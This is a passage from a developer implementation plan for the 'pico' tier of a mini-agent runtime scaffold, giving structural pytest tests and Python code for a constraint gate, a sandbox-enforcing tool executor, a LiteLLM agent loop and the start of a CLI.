# Mini-Amplifier Factory Implementation Plan — Phase A: Runtime Scaffolds

> **For execution:** Use `/execute-plan` mode or the subagent-driven-development recipe.

**Goal:** Transform the harness-machine from a constraint generator into a mini-amplifier factory that produces self-contained AI agents at three size tiers (pico/nano/micro) with 80% of Amplifier's capabilities at 20% of the size.

**Architecture:** Three runtime scaffolds (pico/nano/micro) replace the current flat runtime/ directory. Each tier builds on the previous — nano extends pico with streaming, session persistence, dynamic context, and multi-provider; micro extends nano with modes, recipes, sub-agent delegation, and approval gates. The pico scaffold is modeled directly on ~/dev/pico-amplifier's battle-tested implementation.

**Tech Stack:** Python 3.11+, litellm (LLM client), rich (CLI rendering), pyyaml (config), pytest (testing). No amplifier-core dependency in the scaffolds — they're standalone.

---

## How This Plan is Organized

There are 3 tasks in this plan. Each task:
1. Writes failing tests FIRST (TDD)
2. Creates the scaffold files to make tests pass
3. Commits after passing

**Tests are STRUCTURAL** — they grep for patterns in the generated scaffold files (e.g., "does cli.py contain `rich`?"). We do NOT run the scaffolds during bundle tests. The scaffolds are templates that get copied into generated mini-amplifiers.

**Each tier BUILDS on the previous.** Nano copies pico then adds files. Micro copies nano then adds files. This means if you change a pico file, nano and micro get it too.

---

## Task 1: Pico Runtime Scaffold

**What you're building:** The smallest tier — a laser-focused, single-provider, no-frills constrained agent CLI. ~800-1,200 lines across 9 files. Think: `pico-amplifier-tumor-genome-to-vaccine` — one mission, one provider, done.

**Files to DELETE** (old flat runtime):
- `runtime/__init__.py`
- `runtime/cli.py`
- `runtime/runtime.py`
- `runtime/tools.py`
- `runtime/pyproject.toml.template`
- `runtime/Dockerfile.template`
- `runtime/docker-compose.template.yaml`

**Files to CREATE:**
- `runtime/pico/__init__.py`
- `runtime/pico/cli.py`
- `runtime/pico/runtime.py`
- `runtime/pico/tools.py`
- `runtime/pico/gate.py`
- `runtime/pico/setup.sh.template`
- `runtime/pico/pyproject.toml.template`
- `runtime/pico/Dockerfile.template`
- `runtime/pico/docker-compose.template.yaml`

**Test file:** `tests/test_pico_scaffold.py`

**Files to UPDATE** (existing tests that reference old paths):
- `tests/test_scaffold.py` — the `TestRuntime` class (lines 515-573) checks for `runtime/runtime.py`, `runtime/tools.py`, etc. These must be updated to check for `runtime/pico/`, `runtime/nano/`, `runtime/micro/` instead.

### Step 1: Write the failing tests

Create `tests/test_pico_scaffold.py` with this exact content:

```python
"""Structural tests for the pico runtime scaffold (runtime/pico/).

These tests verify that the pico scaffold files exist and contain
the required patterns. They do NOT import or execute the scaffold code —
the scaffolds are templates that get copied into generated mini-amplifiers.
"""

import os

import pytest

BUNDLE_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PICO_DIR = os.path.join(BUNDLE_ROOT, "runtime", "pico")


def _read_pico(filename: str) -> str:
    """Read a file from the pico scaffold directory."""
    path = os.path.join(PICO_DIR, filename)
    with open(path) as f:
        return f.read()


# ---------------------------------------------------------------------------
# File existence tests
# ---------------------------------------------------------------------------


PICO_FILES = [
    "__init__.py",
    "cli.py",
    "runtime.py",
    "tools.py",
    "gate.py",
    "setup.sh.template",
    "pyproject.toml.template",
    "Dockerfile.template",
    "docker-compose.template.yaml",
]


class TestPicoFilesExist:
    @pytest.mark.parametrize("filename", PICO_FILES)
    def test_pico_file_exists(self, filename):
        path = os.path.join(PICO_DIR, filename)
        assert os.path.isfile(path), f"runtime/pico/{filename} does not exist"

    def test_pico_all_nine_files_exist(self):
        """Verify all 9 expected files are present."""
        for filename in PICO_FILES:
            path = os.path.join(PICO_DIR, filename)
            assert os.path.isfile(path), f"runtime/pico/{filename} missing"


# ---------------------------------------------------------------------------
# cli.py structural tests
# ---------------------------------------------------------------------------


class TestPicoCli:
    def test_has_rich_console_import(self):
        content = _read_pico("cli.py")
        assert "rich" in content, "cli.py must import from rich for markdown rendering"

    def test_has_markdown_rendering(self):
        content = _read_pico("cli.py")
        assert "Markdown" in content, "cli.py must use rich Markdown for response rendering"

    def test_has_keyboard_interrupt_handling(self):
        content = _read_pico("cli.py")
        assert "KeyboardInterrupt" in content, (
            "cli.py must handle KeyboardInterrupt for proper signal handling"
        )

    def test_has_eof_error_handling(self):
        content = _read_pico("cli.py")
        assert "EOFError" in content, (
            "cli.py must handle EOFError (Ctrl-D) to exit with Goodbye"
        )

    def test_has_goodbye_message(self):
        content = _read_pico("cli.py")
        assert "Goodbye" in content, (
            "cli.py must print 'Goodbye' on Ctrl-D exit"
        )

    def test_has_chat_subcommand(self):
        content = _read_pico("cli.py")
        assert '"chat"' in content or "'chat'" in content, (
            "cli.py must have a 'chat' subcommand"
        )

    def test_has_check_subcommand(self):
        content = _read_pico("cli.py")
        assert '"check"' in content or "'check'" in content, (
            "cli.py must have a 'check' subcommand"
        )

    def test_has_audit_subcommand(self):
        content = _read_pico("cli.py")
        assert '"audit"' in content or "'audit'" in content, (
            "cli.py must have an 'audit' subcommand"
        )

    def test_has_config_yaml_loading(self):
        content = _read_pico("cli.py")
        assert "config.yaml" in content or "config_path" in content, (
            "cli.py must load configuration from config.yaml"
        )

    def test_has_system_prompt_file_loading(self):
        content = _read_pico("cli.py")
        assert "system-prompt" in content or "system_prompt" in content, (
            "cli.py must load system prompt from a file"
        )

    def test_has_main_function(self):
        content = _read_pico("cli.py")
        assert "def main(" in content, "cli.py must have a main() entry point"

    def test_has_argparse(self):
        content = _read_pico("cli.py")
        assert "argparse" in content, "cli.py must use argparse for CLI parsing"

    def test_has_console_instance(self):
        content = _read_pico("cli.py")
        assert "Console()" in content, "cli.py must create a Console() instance"

    def test_response_cancelled_message(self):
        """Ctrl-C during agent response should cancel, not exit."""
        content = _read_pico("cli.py")
        assert "cancel" in content.lower() or "cancelled" in content.lower(), (
            "cli.py must cancel response on Ctrl-C during agent turn"
        )


# ---------------------------------------------------------------------------
# runtime.py structural tests
# ---------------------------------------------------------------------------


class TestPicoRuntime:
    def test_has_constraint_gate_usage(self):
        content = _read_pico("runtime.py")
        assert "is_legal_action" in content or "gate" in content.lower(), (
            "runtime.py must use constraint gate (is_legal_action or gate.check)"
        )

    def test_has_retry_logic(self):
        content = _read_pico("runtime.py")
        assert "retry" in content.lower() or "max_retries" in content.lower(), (
            "runtime.py must have retry logic for constraint rejections"
        )

    def test_has_max_iterations(self):
        content = _read_pico("runtime.py")
        assert "MAX_ITERATIONS" in content or "max_iterations" in content, (
            "runtime.py must have MAX_ITERATIONS to prevent infinite loops"
        )

    def test_loads_system_prompt_from_file(self):
        """System prompt must NOT be an inline constant — it must be loaded from a file."""
        content = _read_pico("runtime.py")
        # It should reference a file path, not define a multi-line constant
        has_file_reference = (
            "system_prompt" in content.lower() or "system-prompt" in content.lower()
        )
        assert has_file_reference, (
            "runtime.py must accept system_prompt as a parameter (loaded from file by cli.py)"
        )

    def test_config_not_hardcoded_model(self):
        """Model name must come from config, not be hardcoded."""
        content = _read_pico("runtime.py")
        # Should accept model as a parameter, not hardcode it
        assert "model" in content, (
            "runtime.py must accept model as a parameter from config"
        )
        # The class/function signature should take model as an arg
        assert "def __init__" in content or "def " in content, (
            "runtime.py must have a class or function that accepts model"
        )

    def test_has_litellm_usage(self):
        content = _read_pico("runtime.py")
        assert "litellm" in content, (
            "runtime.py must use litellm for LLM calls"
        )

    def test_has_acompletion(self):
        """Must use async litellm.acompletion, not sync completion."""
        content = _read_pico("runtime.py")
        assert "acompletion" in content, (
            "runtime.py must use litellm.acompletion (async)"
        )

    def test_has_tool_call_processing(self):
        content = _read_pico("runtime.py")
        assert "tool_call" in content or "tool_calls" in content, (
            "runtime.py must process tool calls from LLM responses"
        )

    def test_has_conversation_history(self):
        content = _read_pico("runtime.py")
        assert "messages" in content, (
            "runtime.py must maintain conversation history (messages list)"
        )

    def test_has_tool_schemas(self):
        content = _read_pico("runtime.py")
        assert "TOOL_SCHEMAS" in content or "TOOL_DEFINITIONS" in content, (
            "runtime.py must define tool schemas for the LLM"
        )


# ---------------------------------------------------------------------------
# tools.py structural tests
# ---------------------------------------------------------------------------

REQUIRED_TOOLS = [
    "read_file",
    "write_file",
    "edit_file",
    "apply_patch",
    "bash",
    "grep",
    "glob",
]


class TestPicoTools:
    def test_has_project_root_enforcement(self):
        content = _read_pico("tools.py")
        assert "project_root" in content or "sandbox" in content, (
            "tools.py must enforce project_root boundary (defense-in-depth)"
        )

    def test_has_resolve_and_check(self):
        """Each path-accepting tool must resolve paths and check boundaries."""
        content = _read_pico("tools.py")
        assert "resolve" in content.lower() or "realpath" in content, (
            "tools.py must resolve paths (os.path.realpath) for boundary checking"
        )

    @pytest.mark.parametrize("tool_name", REQUIRED_TOOLS)
    def test_has_tool(self, tool_name):
        content = _read_pico("tools.py")
        assert tool_name in content, (
            f"tools.py must implement the '{tool_name}' tool"
        )

    def test_has_subprocess_for_bash(self):
        content = _read_pico("tools.py")
        assert "subprocess" in content, (
            "tools.py must use subprocess for bash execution"
        )

    def test_has_ripgrep_fallback(self):
        content = _read_pico("tools.py")
        assert "rg" in content or "ripgrep" in content, (
            "tools.py must support ripgrep (with fallback)"
        )

    def test_has_permission_error(self):
        """Path boundary violations must raise PermissionError."""
        content = _read_pico("tools.py")
        assert "PermissionError" in content, (
            "tools.py must raise PermissionError for out-of-boundary paths"
        )

    def test_has_constraint_violation(self):
        """Tool executor must integrate with constraint gate."""
        content = _read_pico("tools.py")
        assert (
            "ConstraintViolation" in content
            or "constraint" in content.lower()
            or "gate" in content.lower()
        ), "tools.py must integrate with the constraint gate"


# ---------------------------------------------------------------------------
# gate.py structural tests
# ---------------------------------------------------------------------------


class TestPicoGate:
    def test_has_constraint_gate_class(self):
        content = _read_pico("gate.py")
        assert "class ConstraintGate" in content, (
            "gate.py must define a ConstraintGate class"
        )

    def test_has_check_method(self):
        content = _read_pico("gate.py")
        assert "def check(" in content, (
            "gate.py must have a check() method"
        )

    def test_has_is_legal_action(self):
        content = _read_pico("gate.py")
        assert "is_legal_action" in content, (
            "gate.py must call is_legal_action from the constraints module"
        )


# ---------------------------------------------------------------------------
# Template structural tests
# ---------------------------------------------------------------------------


class TestPicoTemplates:
    def test_setup_template_creates_venv(self):
        content = _read_pico("setup.sh.template")
        assert "venv" in content, (
            "setup.sh.template must create a virtual environment"
        )

    def test_setup_template_has_pip_install(self):
        content = _read_pico("setup.sh.template")
        assert "pip install" in content, (
            "setup.sh.template must install dependencies"
        )

    def test_setup_template_runs_tests(self):
        content = _read_pico("setup.sh.template")
        assert "pytest" in content or "test" in content, (
            "setup.sh.template must run tests"
        )

    def test_pyproject_has_harness_name(self):
        content = _read_pico("pyproject.toml.template")
        assert "{{harness_name}}" in content, (
            "pyproject.toml.template must use {{harness_name}} template variable"
        )

    def test_pyproject_has_litellm_dep(self):
        content = _read_pico("pyproject.toml.template")
        assert "litellm" in content, (
            "pyproject.toml.template must depend on litellm"
        )

    def test_pyproject_has_rich_dep(self):
        content = _read_pico("pyproject.toml.template")
        assert "rich" in content, (
            "pyproject.toml.template must depend on rich"
        )

    def test_pyproject_has_pyyaml_dep(self):
        content = _read_pico("pyproject.toml.template")
        assert "pyyaml" in content.lower() or "PyYAML" in content, (
            "pyproject.toml.template must depend on pyyaml"
        )

    def test_pyproject_has_hatchling(self):
        content = _read_pico("pyproject.toml.template")
        assert "hatchling" in content, (
            "pyproject.toml.template must use hatchling build system"
        )

    def test_pyproject_has_entry_point(self):
        content = _read_pico("pyproject.toml.template")
        assert "[project.scripts]" in content, (
            "pyproject.toml.template must define a CLI entry point"
        )

    def test_dockerfile_has_python_slim(self):
        content = _read_pico("Dockerfile.template")
        assert "python:3." in content and "slim" in content, (
            "Dockerfile.template must use python:3.x-slim base image"
        )

    def test_dockerfile_has_git_and_ripgrep(self):
        content = _read_pico("Dockerfile.template")
        assert "git" in content, "Dockerfile.template must install git"
        assert "ripgrep" in content, "Dockerfile.template must install ripgrep"

    def test_dockerfile_has_nonroot_user(self):
        content = _read_pico("Dockerfile.template")
        assert "useradd" in content or "adduser" in content or "USER" in content, (
            "Dockerfile.template must run as non-root user"
        )

    def test_docker_compose_has_project_root(self):
        content = _read_pico("docker-compose.template.yaml")
        assert "{{project_root}}" in content, (
            "docker-compose.template.yaml must use {{project_root}} template variable"
        )

    def test_docker_compose_has_resource_limits(self):
        content = _read_pico("docker-compose.template.yaml")
        assert "mem_limit" in content or "memory" in content or "deploy" in content, (
            "docker-compose.template.yaml must set resource limits"
        )

    def test_docker_compose_has_security(self):
        content = _read_pico("docker-compose.template.yaml")
        assert (
            "read_only" in content
            or "security_opt" in content
            or "no-new-privileges" in content
        ), "docker-compose.template.yaml must have security constraints"
```

### Step 2: Run the tests to verify they fail

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
python -m pytest tests/test_pico_scaffold.py -v 2>&1 | head -80
```

Expected: ALL tests FAIL because `runtime/pico/` doesn't exist yet.

### Step 3: Delete old flat runtime files

```bash
cd /Users/michaeljabbour/dev/amplifier-bundle-autoharness
rm -f runtime/__init__.py runtime/cli.py runtime/runtime.py runtime/tools.py
rm -f runtime/pyproject.toml.template runtime/Dockerfile.template runtime/docker-compose.template.yaml
```

**IMPORTANT:** Do NOT delete `runtime/` itself or `runtime/__pycache__/`. The directory stays — we're adding `pico/`, `nano/`, `micro/` inside it.

### Step 4: Create `runtime/pico/__init__.py`

```python
"""Pico runtime scaffold — the minimal tier.

Single provider, selected tools only, constraint engine, Rich CLI.
No sub-agents, no recipes, no modes, no session persistence.
~800-1,200 lines. Laser focused.

This package is copied into generated pico-tier mini-amplifiers
at /harness-finish packaging time.
"""
```

### Step 5: Create `runtime/pico/gate.py`

This is modeled directly on `~/dev/pico-amplifier/src/pico_amplifier/gate.py`.

```python
"""ConstraintGate — thin class wrapper around the generated constraints module.

Provides an object-oriented API so that the runtime and CLI can hold
an instance rather than importing the module-level function directly.

In a generated mini-amplifier, this imports from the generated constraints.py
that ships alongside it. The import path is relative — constraints.py lives
in the same package.
"""

from __future__ import annotations

import importlib.util
import os


class ConstraintGate:
    """Stateful constraint gate bound to a specific project root (sandbox).

    Loads a constraints.py file and delegates to its is_legal_action()
    or validate_action() function. Supports both signatures with auto-detection.
    """

    def __init__(self, project_root: str, constraints_path: str = "constraints.py") -> None:
        """Initialize the constraint gate.

        Args:
            project_root: Absolute path to the project sandbox.
            constraints_path: Path to constraints.py (absolute, or relative to cwd).
        """
        self.project_root = os.path.realpath(project_root)
        self._load_constraints(constraints_path)

    def _load_constraints(self, constraints_path: str) -> None:
        """Load the constraints module and detect its function signature."""
        path = os.path.abspath(constraints_path)
        if not os.path.isfile(path):
            raise FileNotFoundError(f"Constraints file not found: {path}")

        spec = importlib.util.spec_from_file_location("_constraints", path)
        if spec is None or spec.loader is None:
            raise ValueError(f"Could not load constraints module: {path}")
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)  # type: ignore[union-attr]

        # Auto-detect signature
        if hasattr(module, "is_legal_action") and callable(module.is_legal_action):
            self._fn = module.is_legal_action
            self._signature = "is_legal_action"
        elif hasattr(module, "validate_action") and callable(module.validate_action):
            self._fn = module.validate_action
            self._signature = "validate_action"
        else:
            raise ValueError(
                "Constraints module exports neither 'is_legal_action' nor 'validate_action'"
            )

    def check(self, tool_name: str, parameters: dict) -> tuple[bool, str]:
        """Validate a tool invocation against the constraints.

        Returns:
            (True, "")      — action is permitted
            (False, reason) — action is denied; reason explains why
        """
        try:
            if self._signature == "is_legal_action":
                return self._fn(tool_name, parameters, project_root=self.project_root)
            else:
                state = {"project_root": self.project_root}
                action = {"tool_name": tool_name, "parameters": parameters}
                return self._fn(state, action)
        except TypeError:
            # Fallback: constraint fn may not accept project_root kwarg
            if self._signature == "is_legal_action":
                return self._fn(tool_name, parameters)
            raise
        except Exception as exc:
            return False, f"Constraint check error: {exc}"
```

### Step 6: Create `runtime/pico/tools.py`

Modeled on `~/dev/pico-amplifier/src/pico_amplifier/executor.py` — every tool independently enforces the sandbox boundary (defense-in-depth).

```python
"""Standalone tool executor for pico-tier mini-amplifiers.

Implements: read_file, write_file, edit_file, apply_patch, bash, grep, glob.
Every tool independently enforces the project_root boundary (defense-in-depth).

Dependencies: stdlib only (subprocess, pathlib, os, re, shutil).
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
from pathlib import Path


class ConstraintViolation(Exception):
    """Raised when a tool call is denied by the ConstraintGate."""


class LocalToolExecutor:
    """Executes tools against the filesystem, gated by ConstraintGate.

    Every path-accepting method resolves the path against project_root and
    rejects any resolved path that falls outside it. This is defense-in-depth —
    even if the constraint gate is bypassed, tools still enforce boundaries.
    """

    def __init__(self, sandbox_path: str, gate: "ConstraintGate") -> None:  # noqa: F821
        """Initialize the executor.

        Args:
            sandbox_path: Absolute path to the project sandbox directory.
            gate: ConstraintGate instance for pre-execution validation.
        """
        self.sandbox = os.path.realpath(sandbox_path)
        self.gate = gate

    # -- helpers ---------------------------------------------------------------

    def _deny_if_blocked(self, tool_name: str, params: dict) -> None:
        """Check the constraint gate; raise ConstraintViolation if denied."""
        ok, reason = self.gate.check(tool_name, params)
        if not ok:
            raise ConstraintViolation(reason)

    def _resolve(self, path: str) -> str:
        """Resolve a path relative to the sandbox.

        Raises:
            PermissionError: If the resolved path is outside the sandbox.
        """
        expanded = os.path.expanduser(path)
        if not os.path.isabs(expanded):
            expanded = os.path.join(self.sandbox, expanded)
        resolved = os.path.realpath(expanded)
        if resolved == self.sandbox or resolved.startswith(self.sandbox + os.sep):
            return resolved
        raise PermissionError(
            f"Path resolves outside project root: {path!r} -> {resolved!r} "
            f"(project_root: {self.sandbox!r})"
        )

    # -- file tools ------------------------------------------------------------

    def read_file(self, file_path: str) -> str:
        """Read and return the contents of *file_path*."""
        self._deny_if_blocked("read_file", {"file_path": file_path})
        full = self._resolve(file_path)
        with open(full, encoding="utf-8") as fh:
            return fh.read()

    def write_file(self, file_path: str, content: str) -> str:
        """Write *content* to *file_path*, creating parent directories as needed."""
        self._deny_if_blocked("write_file", {"file_path": file_path})
        full = self._resolve(file_path)
        Path(full).parent.mkdir(parents=True, exist_ok=True)
        with open(full, "w", encoding="utf-8") as fh:
            fh.write(content)
        return f"Wrote {len(content)} bytes to {file_path}"

    def edit_file(self, file_path: str, old_string: str, new_string: str) -> str:
        """Replace the first occurrence of *old_string* with *new_string*."""
        self._deny_if_blocked("edit_file", {"file_path": file_path})
        full = self._resolve(file_path)
        with open(full, encoding="utf-8") as fh:
            original = fh.read()
        if old_string not in original:
            raise ValueError(f"old_string not found in {file_path!r}")
        updated = original.replace(old_string, new_string, 1)
        with open(full, "w", encoding="utf-8") as fh:
            fh.write(updated)
        return f"Replaced 1 occurrence in {file_path}"

    # -- apply_patch -----------------------------------------------------------

    def apply_patch(self, path: str, type: str, diff: str = "") -> str:  # noqa: A002
        """Apply a patch to *path*.

        *type* must be one of: create_file | update_file | delete_file.
        *diff* is content or a unified-diff string (required for create/update).
        """
        self._deny_if_blocked("apply_patch", {"path": path, "type": type})
        full = self._resolve(path)

        if type == "delete_file":
            os.remove(full)
            return f"Deleted {path}"

        if type == "create_file":
            Path(full).parent.mkdir(parents=True, exist_ok=True)
            content = _extract_new_content(diff)
            with open(full, "w", encoding="utf-8") as fh:
                fh.write(content)
            return f"Created {path} ({len(content)} bytes)"

        if type == "update_file":
            with open(full, encoding="utf-8") as fh:
                original = fh.read()
            updated = _apply_unified_diff(original, diff)
            with open(full, "w", encoding="utf-8") as fh:
                fh.write(updated)
            return f"Patched {path}"

        raise ValueError(f"Unknown apply_patch type: {type!r}")

    # -- bash ------------------------------------------------------------------

    def bash(self, command: str, timeout: int = 30) -> str:
        """Run *command* in a subprocess with cwd=sandbox. Returns stdout+stderr."""
        self._deny_if_blocked("bash", {"command": command})
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                cwd=self.sandbox,
                timeout=timeout,
            )
            output = result.stdout
            if result.stderr:
                output += ("\n" if output else "") + result.stderr
            return output
        except subprocess.TimeoutExpired:
            raise TimeoutError(f"Command timed out after {timeout}s: {command!r}")

    # -- grep ------------------------------------------------------------------

    def grep(self, pattern: str, path: str = ".") -> str:
        """Search for *pattern* using ripgrep (or Python re fallback)."""
        self._deny_if_blocked("grep", {"pattern": pattern, "path": path})
        search_path = self._resolve(path)

        if shutil.which("rg"):
            cmd = ["rg", "--no-heading", "-n", pattern, search_path]
        else:
            cmd = ["grep", "-rn", pattern, search_path]

        result = subprocess.run(cmd, capture_output=True, text=True, cwd=self.sandbox)
        return result.stdout or "(no matches)"

    # -- glob_files ------------------------------------------------------------

    def glob_files(self, pattern: str, path: str = ".") -> str:
        """Return files matching *pattern* under *path*. Gate tool name is 'glob'."""
        self._deny_if_blocked("glob", {"pattern": pattern, "path": path})
        search_root = Path(self._resolve(path))
        matches = sorted(str(p) for p in search_root.glob(pattern) if p.is_file())
        if not matches:
            return "(no matches)"
        return "\n".join(matches)


# -- unified-diff helpers ------------------------------------------------------

_HUNK_HEADER = re.compile(r"^@@ -(\d+)(?:,(\d+))? \+(\d+)(?:,(\d+))? @@")


def _extract_new_content(diff: str) -> str:
    """Extract new-file content from a unified diff (or return diff verbatim)."""
    if not diff:
        return ""
    lines = diff.splitlines(keepends=True)
    has_header = any(line.startswith("+++") for line in lines)
    if not has_header:
        return diff
    content_lines: list[str] = []
    for line in lines:
        if line.startswith("+++") or line.startswith("---") or line.startswith("@@"):
            continue
        if line.startswith("+"):
            content_lines.append(line[1:])
    return "".join(content_lines)


def _apply_unified_diff(original: str, diff: str) -> str:
    """Apply a unified diff string to *original*. Returns patched content."""
    if not diff.strip():
        return original
    result = original.splitlines(keepends=True)
    lines = diff.splitlines(keepends=True)
    offset = 0
    i = 0
    while i < len(lines):
        m = _HUNK_HEADER.match(lines[i])
        if not m:
            i += 1
            continue
        orig_start = int(m.group(1)) - 1
        i += 1
        new_lines: list[str] = []
        consumed_orig = 0
        while i < len(lines) and not _HUNK_HEADER.match(lines[i]):
            hline = lines[i]
            if hline.startswith("--- ") or hline.startswith("+++ "):
                i += 1
                continue
            if hline.startswith("+"):
                new_lines.append(hline[1:])
            elif hline.startswith("-"):
                consumed_orig += 1
            else:
                new_lines.append(hline[1:] if hline.startswith(" ") else hline)
                consumed_orig += 1
            i += 1
        pos = orig_start + offset
        result[pos : pos + consumed_orig] = new_lines
        offset += len(new_lines) - consumed_orig
    return "".join(result)
```

### Step 7: Create `runtime/pico/runtime.py`

Modeled on `~/dev/pico-amplifier/src/pico_amplifier/agent.py` — async agent loop with litellm, constraint gate, retry, and tool dispatch.

```python
"""PicoAgent — LiteLLM-based async agent loop with constraint-gated tool execution.

The agent:
  1. Accepts a user message.
  2. Calls the LLM (via litellm.acompletion) with a fixed set of tool schemas.
  3. For every tool call the LLM emits:
       - Validates via the ConstraintGate.
       - On approval: executes and appends the result.
       - On ConstraintViolation: appends the denial; retries up to max_retries.
  4. Loops until the LLM returns a plain text response (no tool calls).
  5. Returns the final text.

All config values (model, max_retries, max_iterations) are passed in — nothing
is hardcoded. System prompt is loaded from file by cli.py, not defined here.
"""

from __future__ import annotations

import json

import litellm  # type: ignore[import-untyped]

from .gate import ConstraintGate
from .tools import ConstraintViolation, LocalToolExecutor

# -- tool JSON schemas (OpenAI-compatible) ------------------------------------

TOOL_SCHEMAS: list[dict] = [
    {
        "type": "function",
        "function": {
            "name": "read_file",
            "description": "Read the contents of a file within the sandbox.",
            "parameters": {
                "type": "object",
                "properties": {
                    "file_path": {
                        "type": "string",
                        "description": "Path to the file (relative or absolute within sandbox).",
                    }
                },
                "required": ["file_path"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "write_file",
            "description": "Write content to a file, creating parent dirs as needed.",
            "parameters": {
                "type": "object",
                "properties": {
                    "file_path": {"type": "string", "description": "Destination path."},
                    "content": {"type": "string", "description": "Content to write."},
                },
                "required": ["file_path", "content"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "edit_file",
            "description": "Replace the first occurrence of old_string with new_string in a file.",
            "parameters": {
                "type": "object",
                "properties": {
                    "file_path": {"type": "string"},
                    "old_string": {"type": "string", "description": "Exact text to find."},
                    "new_string": {"type": "string", "description": "Replacement text."},
                },
                "required": ["file_path", "old_string", "new_string"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "apply_patch",
            "description": "Apply a unified diff or create/delete a file in the sandbox.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {"type": "string", "description": "Target file path."},
                    "type": {
                        "type": "string",
                        "enum": ["create_file", "update_file", "delete_file"],
                        "description": "Operation type.",
                    },
                    "diff": {
                        "type": "string",
                        "description": "Unified diff or content (required for create/update).",
                    },
                },
                "required": ["path", "type"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "bash",
            "description": "Run a shell command inside the sandbox. Network and background processes are blocked.",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string", "description": "Shell command to run."},
                    "timeout": {
                        "type": "integer",
                        "description": "Timeout in seconds (default 30).",
                        "default": 30,
                    },
                },
                "required": ["command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "grep",
            "description": "Search file contents with a regex pattern.",
            "parameters": {
                "type": "object",
                "properties": {
                    "pattern": {"type": "string", "description": "Regex pattern."},
                    "path": {
                        "type": "string",
                        "description": "Directory or file to search (default '.').",
                        "default": ".",
                    },
                },
                "required": ["pattern"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "glob",
            "description": "Find files matching a glob pattern.",
            "parameters": {
                "type": "object",
                "properties": {
                    "pattern": {"type": "string", "description": "Glob pattern (e.g. '**/*.py')."},
                    "path": {
                        "type": "string",
                        "description": "Base directory (default '.').",
                        "default": ".",
                    },
                },
                "required": ["pattern"],
            },
        },
    },
]

TOOL_DEFINITIONS = TOOL_SCHEMAS  # Alias for backward compatibility

# Map LLM tool names -> executor method names (where they differ)
_TOOL_METHOD_MAP: dict[str, str] = {
    "glob": "glob_files",  # executor method is glob_files; tool name is glob
}


class PicoAgent:
    """Async agent loop: LLM <-> constrained tool execution.

    All configuration is injected — nothing hardcoded:
      - model: from config.yaml
      - max_retries: from config.yaml
      - max_iterations: from config.yaml
      - system_prompt: from system-prompt.md file
    """

    def __init__(
        self,
        sandbox_path: str,
        model: str,
        system_prompt: str,
        max_retries: int = 3,
        max_iterations: int = 20,
        constraints_path: str = "constraints.py",
    ) -> None:
        """Initialize the agent.

        Args:
            sandbox_path: Absolute path to the project sandbox.
            model: LiteLLM model identifier (e.g., "anthropic/claude-sonnet-4-20250514").
            system_prompt: The system prompt string (loaded from file by caller).
            max_retries: Max constraint rejections before giving up.
            max_iterations: Hard cap on LLM round-trips to prevent infinite loops.
            constraints_path: Path to the constraints.py file.
        """
        self.gate = ConstraintGate(sandbox_path, constraints_path)
        self.executor = LocalToolExecutor(sandbox_path, self.gate)
        self.model = model
        self.system_prompt = system_prompt
        self.max_retries = max_retries
        self.max_iterations = max_iterations
        self.messages: list[dict] = []

    async def run(self, user_input: str) -> str:
        """Process *user_input* and return the agent's final text response."""
        self.messages.append({"role": "user", "content": user_input})

        denial_count = 0
        iterations = 0

        while iterations < self.max_iterations:
            iterations += 1

            response = await litellm.acompletion(
                model=self.model,
                messages=[{"role": "system", "content": self.system_prompt}, *self.messages],
                tools=TOOL_SCHEMAS,
                tool_choice="auto",
            )

            msg = response.choices[0].message

            # Append assistant turn (preserves tool_calls for multi-turn context)
            assistant_turn: dict = {"role": "assistant", "content": msg.content or ""}
            if msg.tool_calls:
                assistant_turn["tool_calls"] = [
                    {
                        "id": tc.id,
                        "type": "function",
                        "function": {
                            "name": tc.function.name,
                            "arguments": tc.function.arguments,
                        },
                    }
                    for tc in msg.tool_calls
                ]
            self.messages.append(assistant_turn)

            # No tool calls -> final text response
            if not msg.tool_calls:
                return msg.content or ""

            # Process tool calls
            for tc in msg.tool_calls:
                tool_name: str = tc.function.name
                try:
                    params: dict = json.loads(tc.function.arguments)
                except json.JSONDecodeError as exc:
                    tool_result = f"Error: could not parse arguments - {exc}"
                    self.messages.append(
                        {"role": "tool", "tool_call_id": tc.id, "content": tool_result}
                    )
                    continue

                try:
                    result = self._execute_tool(tool_name, params)
                except ConstraintViolation as cv:
                    denial_count += 1
                    tool_result = f"CONSTRAINT VIOLATION: {cv}"
                    self.messages.append(
                        {"role": "tool", "tool_call_id": tc.id, "content": tool_result}
                    )
                    if denial_count >= self.max_retries:
                        self.messages.append(
                            {
                                "role": "user",
                                "content": (
                                    "You have reached the maximum number of constraint "
                                    "violations. Please summarise what you were trying "
                                    "to do and stop."
                                ),
                            }
                        )
                        break
                    continue
                except Exception as exc:
                    tool_result = f"Error executing {tool_name}: {exc}"
                    self.messages.append(
                        {"role": "tool", "tool_call_id": tc.id, "content": tool_result}
                    )
                    continue

                self.messages.append(
                    {"role": "tool", "tool_call_id": tc.id, "content": str(result)}
                )

        return "(agent loop terminated - no final text response)"

    def _execute_tool(self, tool_name: str, params: dict) -> str:
        """Dispatch a validated tool call to the executor. Returns string result."""
        method_name = _TOOL_METHOD_MAP.get(tool_name, tool_name)
        method = getattr(self.executor, method_name, None)
        if method is None:
            raise ConstraintViolation(f"Unknown tool: {tool_name!r}")
        return method(**params)
```

### Step 8: Create `runtime/pico/cli.py`

Modeled on `~/dev/pico-amplifier/src/pico_amplifier/cli.py` with Rich rendering, proper signal handling, config.yaml loading, and system-prompt.md loading.

```python
"""CLI entry point for pico-tier mini-amplifier agents.

Subcommands:
    chat   - Interactive constrained agent session (Rich + Markdown rendering)
    check  - One-shot constraint validation
    audit  - Dry-run: validate proposed tool calls without execution

Features:
    - Rich Console + Markdown rendering for agent responses
    - Proper signal handling: Ctrl-C cancels response, Ctrl-D exits with "Goodbye."
    - Config loaded from config.yaml (not hardcoded)
